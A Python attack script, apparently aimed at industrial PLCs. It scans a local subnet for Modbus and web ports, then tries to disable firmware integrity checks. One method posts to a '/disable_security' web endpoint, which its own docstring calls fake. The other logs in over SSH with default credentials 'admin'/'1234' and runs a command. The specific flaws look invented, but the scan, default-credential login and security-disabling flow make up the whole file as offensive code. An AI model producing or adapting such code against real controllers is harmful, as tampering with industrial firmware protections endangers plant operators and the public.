import nmap
import socket
import requests
import paramiko

# Define the local subnet (Modify based on your network)
LOCAL_SUBNET = "192.168.1.0/24"
MODBUS_PORT = 502  # Common PLC protocol
PLC_WEB_PORT = 80  # Common web configuration port

def find_plc():
    """Scan the network to find the PLC's IP address"""
    nm = nmap.PortScanner()
    print("[*] Scanning network for PLC devices...")
    
    nm.scan(LOCAL_SUBNET, arguments="-p 502,80 --open")
    for host in nm.all_hosts():
        if MODBUS_PORT in nm[host]['tcp'] or PLC_WEB_PORT in nm[host]['tcp']:
            print(f"[+] PLC found at: {host}")
            return host
    return None

def exploit_web_vulnerability(plc_ip):
    """Exploit a fake web-based firmware bypass vulnerability"""
    print("[*] Exploiting web interface to disable firmware integrity checks...")
    exploit_url = f"http://{plc_ip}/disable_security"
    
    try:
        response = requests.post(exploit_url, data={"disable": "true"})
        if response.status_code == 200:
            print("[+] Exploitation successful! Integrity checks disabled.")
        else:
            print("[-] Exploit request failed.")
    except Exception as e:
        print(f"[-] Error: {e}")

def exploit_ssh_vulnerability(plc_ip):
    """Exploit an example SSH backdoor to disable security"""
    print("[*] Attempting SSH login to disable firmware protections...")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(plc_ip, username="admin", password="1234")  # Default weak creds
        stdin, stdout, stderr = ssh.exec_command("disable_integrity_check")
        print(stdout.read().decode())

        print("[+] Security disabled via SSH exploit!")
        ssh.close()
    except Exception as e:
        print(f"[-] SSH exploit failed: {e}")

def main():
    plc_ip = find_plc()
    if not plc_ip:
        print("[-] No PLC found on the network.")
        return

    # Try different exploitation methods
    exploit_web_vulnerability(plc_ip)
    exploit_ssh_vulnerability(plc_ip)

if __name__ == "__main__":
    main()